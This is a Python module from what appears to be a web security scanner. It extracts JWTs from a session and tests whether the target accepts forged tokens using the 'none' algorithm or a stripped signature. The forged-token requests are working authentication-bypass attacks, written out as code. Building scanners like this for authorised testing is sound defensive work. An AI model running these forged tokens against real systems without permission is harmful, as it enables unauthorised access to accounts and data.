from __future__ import annotations
import json
import base64
import logging
import re
from typing import Dict, List, Optional
from .base import BaseScanner

logger = logging.getLogger(__name__)

class JWTScanner(BaseScanner):
    """
    Advanced JWT Scanner.
    Combines standard checks and advanced manual token manipulation attacks.
    """
    name = "jwt"

    def run(self, url: str) -> int:
        bucket = self.name
        self.results[bucket] = []
        vulns = 0

        tokens = self._find_tokens()
        if not tokens:
            return 0

        for token in set(tokens):
            vulns += self._analyze_token(token, url, bucket)
        
        self.set_summary(bucket, vulns)
        return vulns

    def _find_tokens(self) -> List[str]:
        candidates = []
        # Headers
        auth = self.session.headers.get("Authorization", "")
        if "Bearer" in auth:
            candidates.append(auth.split()[1])
        # Cookies
        for c in self.session.cookies:
            if re.match(r"eyJ[a-zA-Z0-9-_]+\.eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+", c.value):
                candidates.append(c.value)
        return candidates

    def _analyze_token(self, token: str, url: str, bucket: str) -> int:
        vulns = 0
        try:
            parts = token.split(".")
            if len(parts) != 3: return 0
            
            header = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))

            # Info
            self.add(bucket, {
                "type": "JWT Info", "severity": "Info", 
                "details": "JWT Decoded", "metadata": {"h": header, "p": payload}
            })

            # Attacks
            if self._attack_none_alg(header, payload, url):
                self.add(bucket, {"type": "JWT 'None' Algorithm", "severity": "Critical", "details": "Accepted alg: none"})
                vulns += 1
            
            if self._attack_null_sig(header, payload, url):
                self.add(bucket, {"type": "JWT Null Signature", "severity": "Critical", "details": "Accepted null signature"})
                vulns += 1

        except Exception as e:
            logger.debug(f"JWT Scan Error: {e}")
        return vulns

    def _attack_none_alg(self, header: Dict, payload: Dict, url: str) -> bool:
        for alg in ["none", "None", "NONE"]:
            h = header.copy(); h["alg"] = alg
            token = f"{self._b64e(json.dumps(h))}.{self._b64e(json.dumps(payload))}."
            if self._verify_access(url, token):
                return True
        return False

    def _attack_null_sig(self, header: Dict, payload: Dict, url: str) -> bool:
        # Keep alg but remove signature bytes
        token = f"{self._b64e(json.dumps(header))}.{self._b64e(json.dumps(payload))}."
        return self._verify_access(url, token)

    def _verify_access(self, url: str, token: str) -> bool:
        try:
            r = self.session.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=5)
            # Simple heuristic: 200 OK and no auth error keywords
            if r.status_code == 200:
                errs = ["invalid", "unauthorized", "login", "sign in"]
                if not any(e in r.text.lower() for e in errs):
                    return True
        except:
            pass
        return False

    def _b64e(self, s: str) -> str:
        return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

    def _b64d(self, s: str) -> str:
        return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4)).decode()
